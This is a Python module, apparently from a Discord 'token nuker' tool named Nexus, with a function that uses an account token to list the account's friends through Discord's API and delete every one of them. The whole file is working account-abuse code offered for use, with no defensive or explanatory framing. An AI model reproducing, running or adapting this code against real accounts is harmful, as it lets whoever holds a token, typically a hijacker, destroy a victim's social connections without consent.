from Helper import *
from Helper.Common.utils import *
from Helper.Plugs.TokenNukerPlugs import *

def deleteFriends(token):
    new_title("Nexus Friend Deleter")
    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
            print(f"{lc} {Fore.BLUE}Friend={Fore.WHITE}{friend['user']['username']}#{friend['user']['discriminator']}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}REMOVED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        except Exception as e:
            print(f"{lc} The following error has been encountered and is being ignored: {e}")